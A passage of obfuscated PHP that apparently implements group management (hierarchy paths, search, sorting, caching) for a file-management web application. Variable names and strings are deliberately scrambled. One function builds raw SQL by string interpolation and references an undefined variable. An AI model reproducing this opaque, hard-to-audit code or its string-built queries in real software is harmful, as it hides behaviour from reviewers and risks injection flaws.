$·¾àÕÜ½ =& $_SERVER[³·—™¤¢]; if (!$¿ïºÚÎ‹[$·¾àÕÜ½[432]] && isset($¿ïºÚÎ‹[$·¾àÕÜ½[1852]]) && $¿ïºÚÎ‹[$·¾àÕÜ½[1852]] == 1) { if ($÷¢‰·°¥ = $this->getInfoSimple($¿ïºÚÎ‹[$·¾àÕÜ½[1852]], !0)) { return $¿ïºÚÎ‹[$·¾àÕÜ½[1852]]; } } else { $÷¢‰·°¥ = $this->getInfoSimple($¿ïºÚÎ‹[$·¾àÕÜ½[432]]); if (!$÷¢‰·°¥) { return !1; } } $¹‡Õ¼åÛ = $·¾àÕÜ½[531]; if ($÷¢‰·°¥[$·¾àÕÜ½[521]]) { $¹‡Õ¼åÛ = $÷¢‰·°¥[$·¾àÕÜ½[521]] . $÷¢‰·°¥[$·¾àÕÜ½[1852]] . $·¾àÕÜ½[50]; } $ç®Ş´¼â = array($·¾àÕÜ½[420] => $this->groupNameAuto($¿ïºÚÎ‹[$·¾àÕÜ½[432]], $¿ïºÚÎ‹[$·¾àÕÜ½[32]]), $·¾àÕÜ½[401] => $¿ïºÚÎ‹[$·¾àÕÜ½[432]], $·¾àÕÜ½[590] => $¹‡Õ¼åÛ, $·¾àÕÜ½[1936] => $¿ïºÚÎ‹[$·¾àÕÜ½[1839]], $·¾àÕÜ½[1937] => 0, $·¾àÕÜ½[1856] => 0); if (isset($¿ïºÚÎ‹[$·¾àÕÜ½[1876]])) { $ç®Ş´¼â[$·¾àÕÜ½[1876]] = $¿ïºÚÎ‹[$·¾àÕÜ½[1876]]; } else { $­å“¶éè = $this->max($·¾àÕÜ½[1876]); if (!$­å“¶éè) { $­å“¶éè = 0; } $ç®Ş´¼â[$·¾àÕÜ½[1876]] = $­å“¶éè + 1; } if (!empty($¿ïºÚÎ‹[$·¾àÕÜ½[1852]])) { $ç®Ş´¼â[$·¾àÕÜ½[1852]] = $¿ïºÚÎ‹[$·¾àÕÜ½[1852]]; } $«ôïâş = $this->add($ç®Ş´¼â); $this->setNamePinyin($«ôïâş, $ç®Ş´¼â[$·¾àÕÜ½[32]]); if (isset($¿ïºÚÎ‹[$·¾àÕÜ½[1938]])) { $this->metaSet($«ôïâş, array($·¾àÕÜ½[1938] => $¿ïºÚÎ‹[$·¾àÕÜ½[1938]], $·¾àÕÜ½[1939] => $¿ïºÚÎ‹[$·¾àÕÜ½[1939]])); unset($¿ïºÚÎ‹[$·¾àÕÜ½[1938]]); unset($¿ïºÚÎ‹[$·¾àÕÜ½[1939]]); } Model($·¾àÕÜ½[1350])->groupRootAdd($«ôïâş); return $«ôïâş; } protected function groupEdit($½³õÒ‘‘, $ææ°‡—) { $éáûíº =& $_SERVER[³·—™¤¢]; $Úì»œè = $this->getInfoSimple($½³õÒ‘‘); if (!$Úì»œè) { return !1; } if (!empty($ææ°‡—[$éáûíº[432]])) { $À«ˆ„œé = $this->getInfoSimple($ææ°‡—[$éáûíº[432]]); if (!$À«ˆ„œé) { return !1; } if ($Úì»œè[$éáûíº[1852]] == $À«ˆ„œé[$éáûíº[1852]]) { return !1; } if ($ææ°‡—[$éáûíº[432]] != $Úì»œè[$éáûíº[432]]) { if ($À«ˆ„œé[$éáûíº[521]] !== $Úì»œè[$éáûíº[521]] && strpos($À«ˆ„œé[$éáûíº[521]], $Úì»œè[$éáûíº[521]] . $Úì»œè[$éáûíº[1852]] . $éáûíº[50]) === 0) { return !1; } $ææ°‡—[$éáûíº[590]] = $À«ˆ„œé[$éáûíº[521]] . $ææ°‡—[$éáûíº[432]] . $éáûíº[50]; $this->_changeChildLevel($Úì»œè, $À«ˆ„œé); } } if (isset($ææ°‡—[$éáûíº[32]])) { $this->setNamePinyin($½³õÒ‘‘, $ææ°‡—[$éáûíº[32]]); } if (isset($ææ°‡—[$éáûíº[1938]])) { $this->metaSet($½³õÒ‘‘, array($éáûíº[1938] => $ææ°‡—[$éáûíº[1938]], $éáûíº[1939] => $ææ°‡—[$éáûíº[1939]])); unset($ææ°‡—[$éáûíº[1938]]); unset($ææ°‡—[$éáûíº[1939]]); } $this->_clearChildrenCache($Úì»œè); return $this->where(array($éáûíº[1940] => $½³õÒ‘‘))->save($ææ°‡—); } private function _clearChildrenCache($…¢Åîº¸) { $©Ï•ï¬µ =& $_SERVER[³·—™¤¢]; $äÔÃ–üÏ = array($©Ï•ï¬µ[590] => array($©Ï•ï¬µ[550], $…¢Åîº¸[$©Ï•ï¬µ[521]] . $…¢Åîº¸[$©Ï•ï¬µ[1852]] . $©Ï•ï¬µ[551])); $ˆ›¬¯à = $this->field($©Ï•ï¬µ[1852])->where($äÔÃ–üÏ)->select(); foreach ($ˆ›¬¯à as $¼©·³Öó) { $this->_clearCache($¼©·³Öó[$©Ï•ï¬µ[1852]]); } } private function _clearCache($×İ œÂù) { $–¯ÛÂ‡ =& $_SERVER[³·—™¤¢]; $this->cacheFunctionClear($–¯ÛÂ‡[1934], $×İ œÂù); $this->cacheFunctionClear($–¯ÛÂ‡[1935], $×İ œÂù); } private function _changeChildLevel($·š¥á¢Ö, $ÒÕÁÈÅò, $‘ğğ‹Ğ = false) { $·ÇÈ¨İ¯ =& $_SERVER[³·—™¤¢]; $¶×ÙĞ™Ä = $·š¥á¢Ö[$·ÇÈ¨İ¯[521]] . $·š¥á¢Ö[$·ÇÈ¨İ¯[1852]] . $·ÇÈ¨İ¯[50]; $ï¼µø©Ğ = $ÒÕÁÈÅò[$·ÇÈ¨İ¯[521]] . $ÒÕÁÈÅò[$·ÇÈ¨İ¯[1852]] . $·ÇÈ¨İ¯[50] . $·š¥á¢Ö[$·ÇÈ¨İ¯[1852]] . $·ÇÈ¨İ¯[50]; if ($‘ğğ‹Ğ) { $ï¼µø©Ğ = $ÒÕÁÈÅò[$·ÇÈ¨İ¯[521]] . $ÒÕÁÈÅò[$·ÇÈ¨İ¯[1852]] . $·ÇÈ¨İ¯[50]; } $²—»‹ûĞ = array($·ÇÈ¨İ¯[590] => array($·ÇÈ¨İ¯[550], $·š¥á¢Ö[$·ÇÈ¨İ¯[521]] . $·š¥á¢Ö[$·ÇÈ¨İ¯[1852]] . $·ÇÈ¨İ¯[551])); $­££·¤ï = array($·ÇÈ¨İ¯[590] => array($·ÇÈ¨İ¯[599], "\x72\145\x70\154\x61\143\145\50\160\141\x72\x65\156\164\114\x65\166\x65\154\54\x27{$¶×ÙĞ™Ä}\x27\x2c\47{$ï¼µø©Ğ}\47\51")); $this->_clearChildrenCache($·š¥á¢Ö); $this->where($²—»‹ûĞ)->data($­££·¤ï)->save(); } public function setNamePinyin($—Ø´£éü, $ÁÖ­×š = false) { $ıÚÁ…­½ =& $_SERVER[³·—™¤¢]; if (!$ÁÖ­×š) { $šÌ¼§±¤ = $this->getInfoSimple($—Ø´£éü); $ÁÖ­×š = $šÌ¼§±¤[$ıÚÁ…­½[32]]; } if (!Input::check($ÁÖ­×š, $ıÚÁ…­½[593])) { $this->metaSet($—Ø´£éü, $ıÚÁ…­½[465], null); $this->metaSet($—Ø´£éü, $ıÚÁ…­½[464], null); return; } $éó´Â• = array($ıÚÁ…­½[465] => str_replace($ıÚÁ…­½[53], $ıÚÁ…­½[12], Pinyin::get($ÁÖ­×š)), $ıÚÁ…­½[464] => Pinyin::get($ÁÖ­×š, $ıÚÁ…­½[594])); $this->metaSet($—Ø´£éü, $éó´Â•); } protected function groupStatus($¨†ıÁÙ, $‰ƒ‹¡§¼) { $ÌîŞìò‚ =& $_SERVER[³·—™¤¢]; $¥§ò˜¨­ = $this->getInfoSimple($¨†ıÁÙ); if (!$¥§ò˜¨­) { return !1; } if ($‰ƒ‹¡§¼ == $ÌîŞìò‚[88]) { $¹¢—íò¡ = $this->parentLevelArray($¥§ò˜¨­[$ÌîŞìò‚[521]]); } else { $®ÙÔ¥âÁ = array($ÌîŞìò‚[590] => array($ÌîŞìò‚[550], $¥§ò˜¨­[$ÌîŞìò‚[521]] . $¥§ò˜¨­[$ÌîŞìò‚[1852]] . $ÌîŞìò‚[551])); $¹¢—íò¡ = $this->where($®ÙÔ¥âÁ)->field($ÌîŞìò‚[1852])->select(); $¹¢—íò¡ = array_to_keyvalue($¹¢—íò¡, $ÌîŞìò‚[12], $ÌîŞìò‚[1852]); } $¹¢—íò¡[] = $¥§ò˜¨­[$ÌîŞìò‚[1852]]; $Öãáü¬õ = array(); foreach ($¹¢—íò¡ as $¨†ıÁÙ) { $Öãáü¬õ[] = array($ÌîŞìò‚[1852] => $¨†ıÁÙ, $ÌîŞìò‚[94] => $ÌîŞìò‚[770], $ÌîŞìò‚[374] => $‰ƒ‹¡§¼); $this->_clearCache($¨†ıÁÙ); } return Model($ÌîŞìò‚[1941])->addAll($Öãáü¬õ, array(), !0); } protected function groupRemove($÷ÎñèÚ™, $“íÍ€£À = false) { $ÛßÄ±‹ =& $_SERVER[³·—™¤¢]; $÷ÕóìÔ° = array($ÛßÄ±‹[1852] => $÷ÎñèÚ™); $ğã­Ù¤ˆ = $this->where($÷ÕóìÔ°)->find(); if (!$ğã­Ù¤ˆ || $ğã­Ù¤ˆ[$ÛßÄ±‹[432]] == 0) { return !1; } if (!$“íÍ€£À) { $ÓŸŞôóÍ = $this->getInfoSimple($ğã­Ù¤ˆ[$ÛßÄ±‹[432]]); $this->_changeChildLevel($ğã­Ù¤ˆ, $ÓŸŞôóÍ, !0); $this->where(array($ÛßÄ±‹[432] => $÷ÎñèÚ™))->save(array($ÛßÄ±‹[432] => $ğã­Ù¤ˆ[$ÛßÄ±‹[432]])); } Model($ÛßÄ±‹[1941])->where($÷ÕóìÔ°)->delete(); Model($ÛßÄ±‹[1942])->where($÷ÕóìÔ°)->delete(); Model($ÛßÄ±‹[845])->groupRootRemove($÷ÎñèÚ™); return $this->where($÷ÕóìÔ°)->delete(); } protected function groupSort($ï€ß) { $§¥à =& $_SERVER[³·—™¤¢]; $ÁÛ´Îæè = array(); foreach ($ï€ß as $ÀÏñÇÛ => $ºàò€æ) { $ÁÛ´Îæè[] = array($§¥à[1852], $ºàò€æ, $§¥à[1876], $ÀÏñÇÛ + 1); } $this->saveAll($ÁÛ´Îæè); } public function listData() { $ÍÙîÒß = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÍÙîÒß[$_SERVER[³·—™¤¢][369]]); return $ÍÙîÒß; } private function _makeOrder($ĞÑŒ£¤« = '') { $Â†ß—’ =& $_SERVER[³·—™¤¢]; $ÒÖ–ô‹‰ = array($Â†ß—’[1852], $Â†ß—’[32], $Â†ß—’[1841], $Â†ß—’[200]); $¾À²Èİ– = array($Â†ß—’[450] => $Â†ß—’[451], $Â†ß—’[452] => $Â†ß—’[453]); $³ÅÁ÷ï = Input::get($Â†ß—’[457], $Â†ß—’[7], $Â†ß—’[1856], $ÒÖ–ô‹‰); $Üß’Òåƒ = Input::get($Â†ß—’[458], $Â†ß—’[7], $Â†ß—’[1943], array($Â†ß—’[1943], $Â†ß—’[452])); $Üß’Òåƒ = $¾À²Èİ–[$Üß’Òåƒ]; $ĞÑŒ£¤« = $ĞÑŒ£¤« . "{$³ÅÁ÷ï}\x20{$Üß’Òåƒ}\x2c\40\147\162\x6f\165\160\111\x44\x20\x61\163\143"; return $this->order($ĞÑŒ£¤«); } public function listChild($³©è×Øˆ) { $µë§ı„ö =& $_SERVER[³·—™¤¢]; $£½ï—ª… = $this->where(array($µë§ı„ö[432] => $³©è×Øˆ))->_makeOrder()->selectPage(200); $this->_listDataApply($£½ï—ª…[$µë§ı„ö[369]]); return $£½ï—ª…; } public function listChildIds($÷ƒË™ö) { $à”ë¦ø¦ =& $_SERVER[³·—™¤¢]; if (is_string($é¥€Ã)) { $÷ƒË™ö = explode($à”ë¦ø¦[50], $÷ƒË™ö); } $Ôœäë® = $this->where(array($à”ë¦ø¦[1852] => array($à”ë¦ø¦[7], $÷ƒË™ö)))->field($à”ë¦ø¦[1944])->select(); if (!$Ôœäë®) { return !1; } $¿†ÚâÛÇ = array(); foreach ($Ôœäë® as $¼¿º¬ø€) { $¿†ÚâÛÇ[] = "\x73\145\154\x65\x63\x74\x20\x67\162\157\x75\160\x49\104\x20\x66\162\x6f\155\40\140\x67\162\x6f\165\x70\x60\x20\x77\x68\145\162\x65\40\x70\x61\162\x65\156\164\x4c\x65\x76\145\x6c\40\x6c\151\153\145\x20\x27{$¼¿º¬ø€[$à”ë¦ø¦[521]]}{$¼¿º¬ø€[$à”ë¦ø¦[1852]]}\54\45\x27"; } $¿†ÚâÛÇ = implode($à”ë¦ø¦[1945], $¿†ÚâÛÇ); $Ôœäë® = $this->query($¿†ÚâÛÇ); if (!$Ôœäë®) { return array(); } $÷ƒË™ö = array_to_keyvalue($Ôœäë®, $à”ë¦ø¦[12], $à”ë¦ø¦[1852]); return array_unique($÷ƒË™ö); } public function listByID($ø§´¿‚ı) { $Ã›“³Ë  =& $_SERVER[³·—™¤¢]; if (!$ø§´¿‚ı) { return array(); } $—èÏ«—É = array($Ã›“³Ë [1852] => array($Ã›“³Ë [7], $ø§´¿‚ı)); $Œà¯æ±Ò = $this->where($—èÏ«—É)->select(); $Œà¯æ±Ò = array_sort_keep($Œà¯æ±Ò, $Ã›“³Ë [1852], $ø§´¿‚ı); $this->_listDataApply($Œà¯æ±Ò); return $Œà¯æ±Ò; } public function listSearch($¡üÖîµØ) { $òèâäöã =& $_SERVER[³·—™¤¢]; $šõêµòú = $¡üÖîµØ[$òèâäöã[1946]]; $ˆí¼Ó î = isset($¡üÖîµØ[$òèâäöã[1947]]) ? $¡üÖîµØ[$òèâäöã[1947]] : !1; if (!trim($šõêµòú)) { return !1; } $šõêµòú = str_replace($òèâäöã[1948], $òèâäöã[1949], $šõêµòú); $Áúˆ¸‹˜ = array($òèâäöã[1852] => array($òèâäöã[383], "{$šõêµòú}\45"), $òèâäöã[32] => array($òèâäöã[383], "\x25{$šõêµòú}\x25"), $òèâäöã[1023] => $òèâäöã[1950]); if ($ˆí¼Ó î) { $«·†„şñ = $this->getInfoSimple($ˆí¼Ó î); $ÄÁ—ò£ = $«·†„şñ[$òèâäöã[521]] . $ˆí¼Ó î . $òèâäöã[551]; $Áúˆ¸‹˜ = array($Áúˆ¸‹˜, array($òèâäöã[521] => array($òèâäöã[383], $ÄÁ—ò£))); } $Áúˆ¸‹˜ = $this->parseWhereLike($Áúˆ¸‹˜); $”îÒ§³ = $this->_makeOrder()->where($Áúˆ¸‹˜)->selectPage(20); $”îÒ§³ = $”îÒ§³ ? $”îÒ§³ : array($òèâäöã[369] => array(), $òèâäöã[366] => array()); if (!$”îÒ§³ || count($”îÒ§³[$òèâäöã[369]]) < 5 && Input::check($šõêµòú, $òèâäöã[318])) { $œ£ÒóÀÄ = $this->groupChildrenAll($ˆí¼Ó î); $¨ÜªÆ¨‡ = $this->_searchFromMeta($òèâäöã[464], $šõêµòú, 10, $œ£ÒóÀÄ); $ÊÉìÂ¯ß = $this->_searchFromMeta($òèâäöã[465], $šõêµòú, 10, $œ£ÒóÀÄ); $Ì§¢ë£å = array_merge($¨ÜªÆ¨‡, $ÊÉìÂ¯ß, $”îÒ§³[$òèâäöã[369]]); $”îÒ§³[$òèâäöã[369]] = array_unique_by_key($Ì§¢ë£å, $òèâäöã[1852]); $”îÒ§³[$òèâäöã[366]][$òèâäöã[367]] = count($”îÒ§³[$òèâäöã[369]]); $”îÒ§³[$òèâäöã[366]][$òèâäöã[368]] = ceil($”îÒ§³[$òèâäöã[366]][$òèâäöã[367]] / $”îÒ§³[$òèâäöã[366]][$òèâäöã[363]]); } $this->_listDataApply($”îÒ§³[$òèâäöã[369]]); return $”îÒ§³; } protected function groupChildrenAll($¥ãìÀÇç) { $úºĞ¸üâ =& $_SERVER[³·—™¤¢]; if (!$¥ãìÀÇç) { return !1; } if (is_string($¥ãìÀÇç)) { $¥ãìÀÇç = array($¥ãìÀÇç); } $Ù³ãıéº = $¥ãìÀÇç; foreach ($¥ãìÀÇç as $‹ŸÅ’‰) { $ÛäÔ¹­ = $this->getInfoSimple($‹ŸÅ’‰); $Ì¦äŞâÚ = array($úºĞ¸üâ[521] => array($úºĞ¸üâ[383], $ÛäÔ¹­[$úºĞ¸üâ[521]] . $‹ŸÅ’‰ . $úºĞ¸üâ[551])); $™ÕÒ½À• = $this->field($úºĞ¸üâ[1852])->where($Ì¦äŞâÚ)->select(); $Ù³ãıéº = array_merge($Ù³ãıéº, array_to_keyvalue($™ÕÒ½À•, $úºĞ¸üâ[12], $úºĞ¸üâ[1852])); } return array_unique($Ù³ãıéº); } private function _searchFromMeta($±‡¢¾Ñ”, $§ ’º½Ä, $‚àçÑŒÖ, $Ø‘è•éç) { $­â®Ö´Æ =& $_SERVER[³·—™¤¢]; $§ ’º½Ä = strtolower($§ ’º½Ä); $ÍğêÈÆ = array($­â®Ö´Æ[94] => $±‡¢¾Ñ”, $­â®Ö´Æ[374] => array($­â®Ö´Æ[383], "\45{$§ ’º½Ä}\45")); $ÍğêÈÆ = $this->parseWhereLike($ÍğêÈÆ); if ($Ø‘è•éç) { $ÍğêÈÆ[$­â®Ö´Æ[1852]] = array($­â®Ö´Æ[7], $Ø‘è•éç); } $éÌ¯õò« = Model($­â®Ö´Æ[1951])->where($ÍğêÈÆ)->limit($‚àçÑŒÖ)->select(); if (!$éÌ¯õò«) { return array(); } $éÌ¯õò« = array_to_keyvalue($éÌ¯õò«, $­â®Ö´Æ[12], $­â®Ö´Æ[1852]); $º¸´–¹ = $this->where(array($­â®Ö´Æ[1940] => array($­â®Ö´Æ[7], $éÌ¯õò«)))->select(); if (!$º¸´–¹) { return array(); } return $º¸´–¹; } protected function _listDataApplyItem($Ÿ®×çø) { $÷²¥Ã¹á = array($Ÿ®×çø); $this->_listDataApply($÷²¥Ã¹á); return $÷²¥Ã¹á[0]; } protected function _listDataApply(&$èÍ”¯ùÙ) { $ûıçúã˜ =& $_SERVER[³·—™¤¢]; if (!$èÍ”¯ùÙ) { return; } $Í‡ü´êú = array_to_keyvalue($èÍ”¯ùÙ, $ûıçúã˜[12], $ûıçúã˜[1852]); $this->_listAppendChildren($èÍ”¯ùÙ); $this->_listAppendChildrenMember($èÍ”¯ùÙ); $this->_listAppendMeta($èÍ”¯ùÙ, $Í‡ü´êú); $this->_listAppendParent($èÍ”¯ùÙ); $this->_listAppendSourceRoot($èÍ”¯ùÙ, $Í‡ü´êú); } private function _listAppendChildren(&$ªÒÀÖ‹) { $”Ì½Òô =& $_SERVER[³·—™¤¢]; $”¶Ô“—— = array_to_keyvalue($ªÒÀÖ‹, $”Ì½Òô[12], $”Ì½Òô[1852]); $Š÷ú¢Ÿµ = array($”Ì½Òô[432] => array($”Ì½Òô[7], $”¶Ô“——)); $ü·†³°ï = array($”Ì½Òô[432], $”Ì½Òô[1952] => $”Ì½Òô[500]); $¥¶™¾ÁĞ = $this->field($ü·†³°ï)->where($Š÷ú¢Ÿµ)->group($”Ì½Òô[432])->select(); $÷µŸŒÚÉ = array_to_keyvalue($¥¶™¾ÁĞ, $”Ì½Òô[432], $”Ì½Òô[500]); foreach ($ªÒÀÖ‹ as &$Ó“â´²”) { $æ—Æ§‚İ = $Ó“â´²”[$”Ì½Òô[1852]]; $Ó“â´²”[$”Ì½Òô[1953]] = isset($÷µŸŒÚÉ[$æ—Æ§‚İ]) ? intval($÷µŸŒÚÉ[$æ—Æ§‚İ]) : !1; } unset($Ó“â´²”); } private function _listAppendChildrenMember(&$åîúÏ«ù) { $™¯Üääù =& $_SERVER[³·—™¤¢]; $æì¦‘¦ = array_to_keyvalue($åîúÏ«ù, $™¯Üääù[12], $™¯Üääù[1852]); $¶¿·„ä = array($™¯Üääù[1852] => array($™¯Üääù[7], $æì¦‘¦)); $º «°ÀÜ = array($™¯Üääù[1852], $™¯Üääù[1952] => $™¯Üääù[500]); $ÌÎ÷ßè² = Model($™¯Üääù[1942])->field($º «°ÀÜ)->where($¶¿·„ä)->group($™¯Üääù[1852])->select(); $¡—›»‡¾ = array_to_keyvalue($ÌÎ÷ßè², $™¯Üääù[1852], $™¯Üääù[500]); foreach ($åîúÏ«ù as &$´©ËØã™) { $™ï­…·Ç = $´©ËØã™[$™¯Üääù[1852]]; $´©ËØã™[$™¯Üääù[1954]] = isset($¡—›»‡¾[$™ï­…·Ç]) ? intval($¡—›»‡¾[$™ï­…·Ç]) : !1; } unset($´©ËØã™); } private function _listAppendMeta(&$Ş²æåáü, $êÛ®‹Ù») { $éÌ†§ÃÍ =& $_SERVER[³·—™¤¢]; $Ô¥ñ‹èã = array($éÌ†§ÃÍ[1852] => array($éÌ†§ÃÍ[7], $êÛ®‹Ù»)); $ØóÃ×Ò¢ = Model($éÌ†§ÃÍ[1941])->where($Ô¥ñ‹èã)->select(); $ØóÃ×Ò¢ = array_to_keyvalue_group($ØóÃ×Ò¢, $éÌ†§ÃÍ[1852]); foreach ($ØóÃ×Ò¢ as &$Íü¶áÁğ) { $Íü¶áÁğ = array_to_keyvalue($Íü¶áÁğ, $éÌ†§ÃÍ[94], $éÌ†§ÃÍ[374]); } unset($Íü¶áÁğ); foreach ($Ş²æåáü as &$÷±ÕğÖë) { $÷±ÕğÖë[$éÌ†§ÃÍ[466]] = array(); if (isset($ØóÃ×Ò¢[$÷±ÕğÖë[$éÌ†§ÃÍ[1852]]])) { $÷±ÕğÖë[$éÌ†§ÃÍ[466]] = $ØóÃ×Ò¢[$÷±ÕğÖë[$éÌ†§ÃÍ[1852]]]; } } unset($÷±ÕğÖë); } protected function parentLevelArray($€¼İ¦ş) { $¢Š†¡­ =& $_SERVER[³·—™¤¢]; $€¼İ¦ş = explode($¢Š†¡­[50], trim($€¼İ¦ş, $¢Š†¡­[50])); $€¼İ¦ş = array_remove_value($€¼İ¦ş, $¢Š†¡­[197]); return $€¼İ¦ş; } protected function parentInGroup($§ÂÏö‡, $·ƒĞ ©Â) { $›•ÌˆÀß =& $_SERVER[³·—™¤¢]; $ˆêÛ³¦â = $this->getInfoSimple($§ÂÏö‡); if (!$ˆêÛ³¦â) { return !0; } $„ùòş½ = $this->parentLevelArray($ˆêÛ³¦â[$›•ÌˆÀß[521]]); $„ùòş½[] = $§ÂÏö‡; foreach ($„ùòş½ as $§ÂÏö‡) { if (in_array($§ÂÏö‡ . $›•ÌˆÀß[12], $·ƒĞ ©Â)) { return !0; } } return !1; } private function _listAppendParent(&$œÏÅÖ¿û) { $­ùŠÄİ =& $_SERVER[³·—™¤¢]; $•‡Ò÷šÁ = array(); foreach ($œÏÅÖ¿û as &$€çÃæŒ) { $•‡Ò÷šÁ[$€çÃæŒ[$­ùŠÄİ[1852]]] = $€çÃæŒ[$­ùŠÄİ[32]]; $ÑŞ¬ò = $this->parentLevelArray($€çÃæŒ[$­ùŠÄİ[521]]); foreach ($ÑŞ¬ò as $»°‹—´÷) { if (!isset($•‡Ò÷šÁ[$»°‹—´÷])) { $•‡Ò÷šÁ[$»°‹—´÷] = 0; } } } unset($€çÃæŒ); foreach ($•‡Ò÷šÁ as $”øèö—¡ => $ÊïœšĞü) { if ($ÊïœšĞü) { continue; } $ªİ Ó€³ = $this->getInfoSimple($”øèö—¡); $•‡Ò÷šÁ[$”øèö—¡] = $ªİ Ó€³[$­ùŠÄİ[32]]; } $‰•Ï£­ = $GLOBALS[$­ùŠÄİ[6]][$­ùŠÄİ[89]][$­ùŠÄİ[1955]]; if ($GLOBALS[$­ùŠÄİ[503]] == $­ùŠÄİ[88]) { $‰•Ï£­ = !1; } foreach ($œÏÅÖ¿û as &$€çÃæŒ) { $ÑŞ¬ò = $this->parentLevelArray($€çÃæŒ[$­ùŠÄİ[521]]); $‘¾‰ ã† = $­ùŠÄİ[12]; foreach ($ÑŞ¬ò as $”øèö—¡ => $»°‹—´÷) { if ($‰•Ï£­ && $”øèö—¡ == 0) { continue; } $‘¾‰ ã† .= $•‡Ò÷šÁ[$»°‹—´÷] . $­ùŠÄİ[8]; } if ($ÑŞ¬ò) { $‘¾‰ ã† .= $€çÃæŒ[$­ùŠÄİ[32]]; } $€çÃæŒ[$­ùŠÄİ[526]] = str_replace($­ùŠÄİ[529], $­ùŠÄİ[8], $‘¾‰ ã†); } unset($€çÃæŒ); } private function _listAppendSourceRoot(&$ßø²ö­, $ÂÄÄÚÉè) { $·¥ñ¶óŸ =& $_SERVER[³·—™¤¢]; $ĞœÚš§ = Model($·¥ñ¶óŸ[845])->listSourceRoot(SourceModel::TYPE_GROUP, $ÂÄÄÚÉè); $ĞœÚš§ = array_to_keyvalue($ĞœÚš§, $·¥ñ¶óŸ[505]); $ĞœÚš§ = array_remove_key($ĞœÚš§, $·¥ñ¶óŸ[505]); foreach ($ßø²ö­ as &$˜ºüåô¬) { $˜ºüåô¬[$·¥ñ¶óŸ[86]] = $ĞœÚš§[$˜ºüåô¬[$·¥ñ¶óŸ[1852]]] ? $ĞœÚš§[$˜ºüåô¬[$·¥ñ¶óŸ[1852]]] : array(); } unset($˜ºüåô¬); } protected function groupMerge($¶éİİ‰“) { $¶éİİ‰“ = array_values(array_unique($¶éİİ‰“)); $±À±ÅÍ = array(); for ($ÌšöÆ¾¬ = 0; $ÌšöÆ¾¬ < count($¶éİİ‰“); $ÌšöÆ¾¬++) { $éË¨ÏÕì = !1; for ($­İÙÜÔŞ = 0; $­İÙÜÔŞ < count($¶éİİ‰“); $­İÙÜÔŞ++) { if ($ÌšöÆ¾¬ == $­İÙÜÔŞ) { continue; } if ($this->isParentOf($¶éİİ‰“[$­İÙÜÔŞ], $¶éİİ‰“[$ÌšöÆ¾¬])) { $éË¨ÏÕì = !0; break; } } if (!$éË¨ÏÕì) { $±À±ÅÍ[] = $¶éİİ‰“[$ÌšöÆ¾¬]; } } return $±À±ÅÍ; } protected function isParentOf($À—€ˆúŞ, $´Öâ‹é‚) { $íçî¸Á =& $_SERVER[³·—™¤¢]; if (!$À—€ˆúŞ || !$´Öâ‹é‚ || $À—€ˆúŞ == $´Öâ‹é‚) { return !1; } $‡Ì’ Ÿ = $this->getInfoSimple($À—€ˆúŞ); $‚ê¯­Â© = $this->getInfoSimple($´Öâ‹é‚); $ÓÄÄÎş = $‡Ì’ Ÿ[$íçî¸Á[521]] . $À—€ˆúŞ . $íçî¸Á[50]; if (substr($‚ê¯­Â©[$íçî¸Á[521]], 0, strlen($ÓÄÄÎş)) == $ÓÄÄÎş) { return !0; } return !1; } public function groupShowRoot($àÖ ÷, $áœ¸ŞĞô = false) { $–‘±ğê =& $_SERVER[³·—™¤¢]; $‡‰²Äö½ = $this->getInfo($àÖ ÷); if (!$‡‰²Äö½) { return array(); } $ôÅºç‰– = $this->parentLevelArray($‡‰²Äö½[$–‘±ğê[521]]); $ëÔ˜æº× = array($àÖ ÷); if (count($ôÅºç‰–) == 0) { return $ëÔ˜æº×; } if ($áœ¸ŞĞô && count($ôÅºç‰–) == 1) { return $ëÔ˜æº×; } if (!$‡‰²Äö½[$–‘±ğê[466]] || !isset($‡‰²Äö½[$–‘±ğê[466]][$–‘±ğê[1938]]) || $‡‰²Äö½[$–‘±ğê[466]][$–‘±ğê[1938]] == $–‘±ğê[1907]) { return $this->groupShowRoot($ôÅºç‰–[count($ôÅºç‰–) - 1], $áœ¸ŞĞô); } if ($‡‰²Äö½[$–‘±ğê[466]][$–‘±ğê[1938]] == $–‘±ğê[357]) { $ê£ñ­î = explode($–‘±ğê[50], $‡‰²Äö½[$–‘±ğê[466]][$–‘±ğê[1939]]); if ($ê£ñ­î) { $ëÔ˜æº× = array_merge($ëÔ˜æº×, $ê£ñ­î); } } return $ëÔ˜æº×; } protected function resetParentLevel() { $¯²±İ±« =& $_SERVER[³·—™¤¢]; $¼‘÷ÛŸñ = $¯²±İ±«[1852]; $’Ğ¡ò™ = $this->select(); $’Ğ¡ò™ = array_to_keyvalue($’Ğ¡ò™, $¼‘÷ÛŸñ); foreach ($’Ğ¡ò™ as $’üÏˆıÎ) { $šÃèÜÚ’ = $’üÏˆıÎ; $«Ò÷÷³‹ = array(); while ($šÃèÜÚ’[$¯²±İ±«[432]] != 0) { $«Ò÷÷³‹[] = $šÃèÜÚ’[$¯²±İ±«[432]]; $šÃèÜÚ’ = $’Ğ¡ò™[$šÃèÜÚ’[$¯²±İ±«[432]]]; } $«Ò÷÷³‹[] = 0; $«Ò÷÷³‹ = $¯²±İ±«[50] . implode($¯²±İ±«[50], array_reverse($«Ò÷÷³‹)) . $¯²±İ±«[50]; $this->setNamePinyin($’üÏˆıÎ[$¼‘÷ÛŸñ], $’üÏˆıÎ[$¯²±İ±«[32]]); $this->where(array($¼‘÷ÛŸñ => $’üÏˆıÎ[$¼‘÷ÛŸñ]))->save(array($¯²±İ±«[590] => $«Ò÷÷³‹)); } return $’Ğ¡ò™; } public function groupNameAuto($“Îµ²ü, $óÄîÚ) { $¶åÅÁ‘´ =& $_SERVER[³·—™¤¢]; $Š«ÔÃÔ = $this->where(array($¶åÅÁ‘´[401] => $“Îµ²ü))->getField($¶åÅÁ‘´[32], !0); if (!$Š«ÔÃÔ || !in_array($óÄîÚ, $Š«ÔÃÔ)) { return $óÄîÚ; } for ($øÏı…³Ã = 1; $øÏı…³Ã <= count($Š«ÔÃÔ) + 1; $øÏı…³Ã++) { $ß¶™å¶ = $óÄîÚ . "\50{$øÏı…³Ã}\x29"; if (!in_array($ß¶™å¶, $Š«ÔÃÔ)) { return $ß¶™å¶; } } } public function groupSwitch($Ôú“òñ, $¾Ğ–Ş´š) { $–ÊäÑ•Ù =& $_SERVER[³·—™¤¢]; $Œ¨µ¬½Í = array($–ÊäÑ•Ù[1852] => array($–ÊäÑ•Ù[7], array($Ôú“òñ, $¾Ğ–Ş´š))); $§”  µ = $this->where($Œ¨µ¬½Í)->select(); $§”  µ = array_to_keyvalue($§”  µ, $–ÊäÑ•Ù[1852]); 